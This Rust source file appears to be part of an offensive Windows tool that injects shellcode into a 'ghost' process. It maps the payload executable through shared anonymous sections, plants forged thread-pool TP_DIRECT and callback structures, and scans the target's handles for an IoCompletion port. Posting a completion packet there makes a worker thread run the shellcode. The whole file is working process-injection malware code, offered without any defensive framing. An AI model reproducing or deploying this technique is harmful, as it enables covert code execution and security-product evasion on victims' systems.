use core::ptr::null_mut;
use core::ffi::c_void;

use crate::core::types::*;
use crate::core::nt;
use crate::debug;

unsafe fn try_post_io_completion(target_process: HANDLE, tp_direct_addr: *mut c_void) -> bool { unsafe {
    // Query the ghosted process handles via ProcessHandleInformation
    // This reqturn ONLY the process handles, no system-wide enumeration
    // Ghost process has very few handles, so a small buffer suffices
    let mut buffer_size: usize = 4096; // 5-10 handles * 40 bytes for each, 4KB is more than enough
    let mut buffer: *mut c_void;
    let mut return_length: u32 = 0;

    loop {
        buffer = null_mut();
        let mut size = buffer_size;
        let status = nt::nt_allocate_virtual_memory(
            -1isize as HANDLE,
            &mut buffer,
            0,
            &mut size,
            0x00001000 | 0x00002000,
            0x04,
        );
        if status != STATUS_SUCCESS || buffer.is_null() {
            return false;
        }

        let status = nt::nt_query_information_process(
            target_process,
            51, // ProcessHandleInformation
            buffer,
            size as u32,
            &mut return_length,
        );
        if status == STATUS_SUCCESS {
            break;
        }

        free_virtual_memory(buffer);

        // STATUS_INFO_LENGTH_MISMATCH — retry with larger buffer
        if status == 0xC0000004u32 as i32 {
            buffer_size = (return_length as usize) + 1024;
        } else {
            debug!("[POOL] NtQueryInformationProcess(51) failed: 0x{:08X}", status);
            return false;
        }
    } 

    let header = buffer as *const ProcessHandleSnapshotInformation;
    let handles_count = (*header).number_of_handles;
    let handles_array = (buffer as usize + core::mem::size_of::<ProcessHandleSnapshotInformation>()) as *const ProcessHandleTableEntryInfo;

    let current_process: HANDLE = -1isize as HANDLE;
    let mut tried_count: usize = 0;
    let mut posted = false;

    debug!("[POOL] Process has {} handles, scanning for IoCompletion", handles_count);

    for i in 0..handles_count {
        let entry = &*handles_array.add(i);

        // Duplicate this handle into our process
        let mut local_handle: HANDLE = null_mut();
        let status = nt::nt_duplicate_object(
            target_process,
            entry.handle_value as HANDLE,
            current_process,
            &mut local_handle,
            0,
            0,
            0x00000002, // DUPLICATE_SAME_ACCESS
        );
        if status != STATUS_SUCCESS || local_handle.is_null() {
            continue;
        }
        tried_count += 1;

        // Try posting a completion packet, which only succeeds on IoCompletion handles
        // KeyContext = TP_DIRECT pointer 
        let status = nt::nt_set_io_completion(
            local_handle,
            tp_direct_addr,   // KeyContext
            null_mut(),       // ApcContext
            STATUS_SUCCESS,   // IoStatus
            0,                // IoInformation
        );

        if status == STATUS_SUCCESS {
            debug!(
                "[POOL] Posted to IoCompletion! handle=0x{:X} type_idx={} (tried {}/{})",
                entry.handle_value, entry.object_type_index, tried_count, handles_count
            );
            nt::nt_close(local_handle);
            posted = true;
            break;
        }      

        // Not IoCompletion, close and try the next
        nt::nt_close(local_handle);
    }

    if !posted {
        debug!("[POOL] No IoCompletion found ({} handles tried out of {})", tried_count, handles_count);
    }

    free_virtual_memory(buffer);
    posted
}}


/**
 * Helper to free virtual memory allocated in our own process
 * */
unsafe fn free_virtual_memory(mut buffer: *mut c_void) { unsafe {
    let mut free_size: usize = 0;
    nt::nt_allocate_virtual_memory(
        -1isize as HANDLE,
        &mut buffer,
        0,
        &mut free_size,
        0x00008000, // MEM_RELEASE
        0,
    );
}}


pub unsafe fn migrate(shellcode: &[u8], process_handle: HANDLE, target_pid: usize) -> bool { unsafe {
    if shellcode.is_empty() || process_handle.is_null() || target_pid == 0 {
        return false;
    }
    debug!("[POOL] Target: PID {} handle {:p}", target_pid, process_handle);

    let section_size: i64 = shellcode.len() as i64;
    let mut section_handle: HANDLE = null_mut();

    // Create anonymous section (no file backing, PAGE_EXECUTE_READWIRTE)
    // The section itself has RWX capability, but views are mapped with restricted permissions
    let status = nt::nt_create_section(
        &mut section_handle,
        0x000F001F, // SECTION_ALL_ACCESS
        null_mut(), // no ObjectAttributes
        &section_size as *const i64 as *mut c_void, // MaximumSize
        0x40,       // PAGE_EXECUTE_READWRITE
        0x08000000, // SEC_COMMIT
        null_mut(), // no file handle
    );
    if status != STATUS_SUCCESS || section_handle.is_null() {
        debug!("[POOL] NtCreateSection (anonymous) failed: 0x{:08X}", status);
        return false;
    }

    // Map local vew as RW, write shellcode through this view
    let mut local_view: *mut c_void = null_mut();
    let mut local_view_size: usize = 0;
    let current_process: HANDLE = -1isize as HANDLE;

    let status = nt::nt_map_view_of_section(
        section_handle,
        current_process,    // our process
        &mut local_view,
        0,                  // ZeroBits
        0,                  // CommitSize
        null_mut(),         // SectionOffset
        &mut local_view_size,
        2,                  // ViewUnmap
        0,                  // AllocationType
        0x04,               // PAGE_READWRITE
    );
    if status != STATUS_SUCCESS || local_view.is_null() {
        debug!("[POOL] NtMapViewOfSection (local RW) failed: 0x{:08X}", status);
        nt::nt_close(section_handle);
        return false;
    }

    // Write shellcode into local RW view
    core::ptr::copy_nonoverlapping(
        shellcode.as_ptr(),
        local_view as *mut u8, 
        shellcode.len()
    );

    // Unmap local view, cuz done wirting and I do not need it anymore
    nt::nt_unmap_view_of_section(current_process, local_view);

    // Map remote view as RX in the ghost process, this makes the shellcode executable
    let mut remote_shellcode: *mut c_void = null_mut();
    let mut remote_view_size: usize = 0;

    let status = nt::nt_map_view_of_section(
        section_handle,
        process_handle,     // ghost process
        &mut remote_shellcode,
        0,                  // ZeroBits
        0,                  // CommitSize
        null_mut(),         // SectionOffset
        &mut remote_view_size,
        2,                  // ViewUnmap
        0,                  // AllocationType
        0x20,               // PAGE_EXECUTE_READ 
    );

    // Section handle is not longer needed
    nt::nt_close(section_handle);

    if status != STATUS_SUCCESS || local_view.is_null() {
        debug!("[POOL] NtMapViewOfSection (remote RW) failed: 0x{:08X}", status);
        return false;
    }

    debug!("[POOL] Shellcode mapped: local wrote {}B -> Remote RX@{:p} ({}B view)", shellcode.len(), remote_shellcode, remote_view_size);

    // TP structs via shared section

    let callbacks_size: usize = 16; // 2 pointers: Executecallbacks + Unposted
    let tp_direct_size = core::mem::size_of::<TpDirect>();
    let structs_total = callbacks_size + tp_direct_size;

    // Create anonymous section for TP structs
    let structs_section_size: i64 = structs_total as i64;
    let mut structs_section: HANDLE = null_mut();

    let status = nt::nt_create_section(
        &mut structs_section,
        0x000F001F, // SECTION_ALL_ACCESS
        null_mut(), // anonymous — no name, no file
        &structs_section_size as *const i64 as *mut c_void,
        0x04,       // PAGE_READWRITE (section capability)
        0x08000000, // SEC_COMMIT
        null_mut(), // no file handle
    );
    if status != STATUS_SUCCESS || structs_section.is_null() {
        debug!("[POOL] NtCreateSection (TP struct) failed: 0x{:08X}", status);
        return false;
    }

    // Map remote RW view FRIST, we need the remote address to fill the pointers
    let mut remote_structs: *mut c_void = null_mut();
    let mut remote_structs_size: usize = 0; // 0 = map entire section

    let status = nt::nt_map_view_of_section(
        structs_section,
        process_handle,         // ghost process
        &mut remote_structs,
        0,                      // ZeroBits
        0,                      // CommitSize
        null_mut(),             // SectionOffset
        &mut remote_structs_size,
        2,                      // ViewUnmap
        0,                      // AllocationType
        0x04,                   // PAGE_READWRITE
    );
    if status != STATUS_SUCCESS || remote_structs.is_null() {
        debug!("[POOL] NtMapViewOfSection (remote RW structs) failed: 0x{:08X}", status);
        nt::nt_close(structs_section);
        return false;
    }

    // Now we know the remote addresses
    let callbacks_addr = remote_structs;
    let tp_direct_addr = (remote_structs as usize + callbacks_size) as *mut c_void;

    // Map local RW view
    let mut local_structs: *mut c_void = null_mut();
    let mut local_structs_size: usize = 0;

    let status = nt::nt_map_view_of_section(
        structs_section,
        current_process,        // our process
        &mut local_structs,
        0,                      // ZeroBits
        0,                      // CommitSize
        null_mut(),             // SectionOffset
        &mut local_structs_size,
        2,                      // ViewUnmap
        0,                      // AllocationType
        0x04,                   // PAGE_READWRITE
    );

    // Section handle is no longer needed
    nt::nt_close(structs_section);

    if status != STATUS_SUCCESS || local_structs.is_null() {
        debug!("[POOL] NtMapViewOfSection (local RW structs) failed: 0x{:08X}", status);
        return false;
    }

    debug!("[POOL] MirrorGate layout: SC(RW)@{:p} CB(RW)@{:p} TD(RW)@{:p} mirror@{:p}", remote_shellcode, callbacks_addr, tp_direct_addr, local_structs);

    // Write TP_TASK_CALLBACKS through local view: {Executecallbacks = shellcode, Unposted = Null }
    // This populates the shared section, instantly visibale in the remote RW view.
    let local_callbacks = local_structs as *mut [*mut c_void; 2];
    (*local_callbacks) = [remote_shellcode, null_mut()];

    // Write TP_DIRECT through local view
    let local_tp_direct = (local_structs as usize + callbacks_size) as *mut TpDirect;
    core::ptr::write(local_tp_direct, TpDirect {
        task_callbacks: callbacks_addr, // -> remote TP_TASK_CALLBACKS.ExecuteCallback
        task_numa_node: 0,
        task_ideal_processor: 0,
        task_padding: [0; 3],
        task_list_flink: null_mut(),
        task_list_blink: null_mut(),
        lock: 0,
        io_list_flink: null_mut(),
        io_list_blink: null_mut(),
        callback: remote_shellcode, // backup callback at offset 0x38
        numa_node: 0,
        ideal_processor: 0,
        _padding: [0; 3],
    });

    // Unmap local view, data presists in the shared section backing.
    // The remote view remains mapped and readalbe by the ghost process 
    nt::nt_unmap_view_of_section(current_process, local_structs);

    let posted = try_post_io_completion(process_handle, tp_direct_addr);

    if posted {
        debug!("[POOL] Completion packet posted, shellcode will execute in workder thread");
    } else {
        debug!("[POOL] Failed to find/post to IoCompletion port");
    }

    posted
}}
